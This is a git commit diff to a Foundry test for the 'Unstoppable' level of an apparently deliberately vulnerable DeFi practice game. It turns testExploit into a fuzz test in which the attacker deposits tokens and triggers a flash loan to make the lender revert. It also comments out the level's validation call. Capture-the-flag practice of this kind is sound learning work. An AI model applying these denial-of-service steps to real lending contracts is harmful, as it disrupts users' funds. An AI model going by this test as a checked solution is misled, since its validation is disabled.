b376d6e2c106ea893589ba78974357f3399850b8
LeKarimDerradji <karim.derradji.pro@gmail.com>
2022-10-22 14:01:23 +0200

    fuzz

--- test/Levels/unstoppable/Unstoppable.t.sol
+++ test/Levels/unstoppable/Unstoppable.t.sol
@@ -54,11 +54,23 @@ contract Unstoppable is Test {
         console.log(unicode"🧨 PREPARED TO BREAK THINGS 🧨");
     }
 
-    function testExploit() public {
+    function testExploit(uint96 amount, uint96 loan) public {
+        vm.assume(amount > 0.1 ether);
+        vm.assume(amount <= INITIAL_ATTACKER_TOKEN_BALANCE);
+        vm.assume(loan <= TOKENS_IN_POOL && loan > 1);
         /** EXPLOIT START **/
+        vm.startPrank(attacker);
+        receiverUnstoppable = new ReceiverUnstoppable(
+            address(unstoppableLender)
+        );
+        vm.label(address(receiverUnstoppable), "Receiver Unstoppable");
+        dvt.approve(address(unstoppableLender), TOKENS_IN_POOL);
+        unstoppableLender.depositTokens(amount);
+        receiverUnstoppable.executeFlashLoan(loan);
+        vm.stopPrank();
         /** EXPLOIT END **/
         vm.expectRevert(UnstoppableLender.AssertionViolated.selector);
-        validation();
+        //validation();
     }
 
     function validation() internal {
